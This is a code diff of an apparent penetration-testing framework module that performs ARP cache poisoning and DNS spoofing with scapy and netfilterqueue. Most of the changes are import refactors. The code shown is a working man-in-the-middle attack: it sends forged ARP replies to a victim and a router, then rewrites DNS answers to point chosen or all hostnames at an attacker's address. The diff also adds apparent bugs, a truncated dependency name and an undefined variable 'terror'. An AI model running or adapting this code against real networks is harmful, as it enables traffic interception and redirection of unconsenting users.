@@ -1,13 +1,17 @@
 # Copyright (C) 2015 – 2021 Noa-Emil Nissinen (4shadoww)
 
-from core.hakkuframework import *
-from core import colors
+
 import os
-from core import getpath
-from scapy.all import *
-import threading, queue
+import threading
+import queue
 import time
 import traceback
+
+import scapy.all as scapy
+
+from core.hakkuframework import *
+from core import colors
+from core import getpath
 
 importerror = False
 try:
@@ -26,11 +30,11 @@ conf = {
     "author": "4shadoww",
     "github": "4shadoww",
     "email": "4shadoww0@gmail.com",
-    "initdate": "29.4.2016",
-    "lastmod": "31.12.2016",
+    "initdate": "2016-04-29",
+    "lastmod": "2021-07-11",
     "apisupport": False,
     "needroot": 1,
-    "dependencies": ["libnetfilter-queue-dev"]
+    "dependencies": ["libnetfilter-queue-"]
 }
 
 
@@ -75,17 +79,17 @@ class ArpSpoofer(threading.Thread):
         threading.Thread.__init__(self)
 
     def originalMAC(self, ip):
-        ans, unans = arping(ip, verbose=0)
+        ans, unans = scapy.arping(ip, verbose=0)
         for s,r in ans:
-            return r[Ether].src
+            return r[scapy.Ether].src
 
     def poison(self, routerIP, victimIP, routerMAC, victimMAC):
-        send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMAC), verbose=0)
-        send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=routerMAC), verbose=0)
+        scapy.send(scapy.ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMAC), verbose=0)
+        scapy.send(scapy.ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=routerMAC), verbose=0)
 
     def restore(self, routerIP, victimIP, routerMAC, victimMAC):
-        send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victimMAC), count=3, verbose=0)
-        send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=routerMAC), count=3, verbose=0)
+        scapy.send(scapy.ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victimMAC), count=3, verbose=0)
+        scapy.send(scapy.ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=routerMAC), count=3, verbose=0)
 
     def run(self):
         tried = 0
@@ -123,19 +127,19 @@ class ArpSpoofer(threading.Thread):
 def callback(packet):
     found = False
     payload = packet.get_payload()
-    pkt = IP(payload)
+    pkt = scapy.IP(payload)
     
-    if not pkt.haslayer(DNSQR):
+    if not pkt.haslayer(scapy.DNSQR):
         packet.accept()
     else:
         for record in hostlist:
-            if record[1] in pkt[DNS].qd.qname or record[1] == b'*':
-                print_info(pkt[DNS].qd.qname.decode()+" -> "+record[0].decode())
+            if record[1] in pkt[scapy.DNS].qd.qname or record[1] == b'*':
+                print_info(pkt[scapy.DNS].qd.qname.decode()+" -> "+record[0].decode())
                 found = True
-                spoofed_pkt = bytes(IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
-                    UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
-                    DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,\
-                    an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=record[0])))
+                spoofed_pkt = bytes(scapy.IP(dst=pkt[scapy.IP].src, src=pkt[scapy.IP].dst)/\
+                    scapy.UDP(dport=pkt[scapy.UDP].sport, sport=pkt[scapy.UDP].dport)/\
+                    scapy.DNS(id=pkt[scapy.DNS].id, qr=1, aa=1, qd=pkt[scapy.DNS].qd,\
+                    an=scapy.DNSRR(rrname=pkt[scapy.DNS].qd.qname, ttl=10, rdata=record[0])))
 
                 packet.set_payload(spoofed_pkt)
                 packet.accept()
@@ -150,7 +154,7 @@ def run():
     if importerror == True:
         print_error("netfilterqueue isn't imported")
         print_info("install the dependencies and reload this module")
-        print("traceback:\n"+str(error))
+        print("traceback:\n"+str(terror))
         return
 
     controller.reset()
